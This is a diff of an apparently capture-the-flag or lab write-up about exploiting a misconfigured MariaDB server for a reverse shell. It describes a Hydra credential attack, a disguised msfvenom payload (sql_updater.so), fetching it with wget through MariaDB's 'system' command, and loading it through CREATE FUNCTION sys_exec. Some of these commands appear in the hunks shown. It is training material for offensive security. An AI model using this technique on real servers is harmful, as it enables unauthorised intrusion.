@@ -37,7 +37,8 @@ We are back for an other round. In this scenario we no longer rely on **SSH** or
 We have gathered from previous enumiration that the port **3306** is up and running,<br>
 the servise in question is <span class="badge-data">MariaDB</span>, which has a known vulnerability/misconfiguration<br>
 we would like to exploit to gain remote code execution.<br>
-For this caper we are searching for yet another piece of data - file name: "*Valve_specs.txt*".<br>
+For this caper we are searching for yet another piece of data -<br>
+file name: "**Valve_specs.txt**".<br>
 With the vulnerability researched off we pop.<br>
 
 ## 01.MySQL credential Hydra Attack
@@ -73,9 +74,10 @@ Final size of elf-so file: 476 bytes
 Saved as: <span class="red"><strong>sql_updater.so</strong></span>
 </code></pre>
 
-We need to gaina shell on the BUREAU server, so we generate this nifty little file with **Venom**.<br>
-Making sure to specify our attack box as the host and a distinct port that we shall be listening on using **netcat**.<br>
-The payload is named inconspicuously as *sql_updater.so*, doesn't sound suspicious now does it.<br>
+We need to gaina shell on the BUREAU server, so we generate this nifty little file<br>
+with **Venom**. Making sure to specify our attack box as the host and a distinct port<br>
+that we shall be listening on using **netcat**.<br>
+The payload is named inconspicuously as <span class="badge-data">sql_updater.so</span>, doesn't sound suspicious now does it.<br>
 
 ## 03.Enter the SQL
 
@@ -112,7 +114,8 @@ Saving to: ‘/tmp/sql_updater.so’
 MariaDB [(none)]> system chmod +x /tmp/sql_updater.so;
 </code></pre>
 
-To use a non sql command we have to use system as a precursor and make sure to put a semicolon on the end of teh command.<br>
+To use a non sql command we have to use system as a precursor and make sure<br>
+to put a semicolon on the end of the command.<br>
 We use a standart wget call that is going to teh attack box and port 4040.<br>
 The file is downloaded succesfully and we add the executable bit to it for our exploit.<br>
 
@@ -122,8 +125,9 @@ MariaDB [(none)]> CREATE FUNCTION <span class="orange"><strong>sys_exec</strong>
 ERROR 2013 (HY000): Lost connection to server during query  
 </code></pre>
 
-Here we envoke a function that the database would read, but because of a missconfiguration in the settings<br>
-and an unpached service it is actualy executing the file we have provided.<br>
+Here we envoke a function that the database would read, but because of a<br>
+missconfiguration in the settings and an unpached service<br>
+it is actualy executing the file we have provided.<br>
 The MariaDB connection hangs and we gain a shell on our atack box's netcat listener.<br>
 
 <pre data-label="shell recieved"><code>
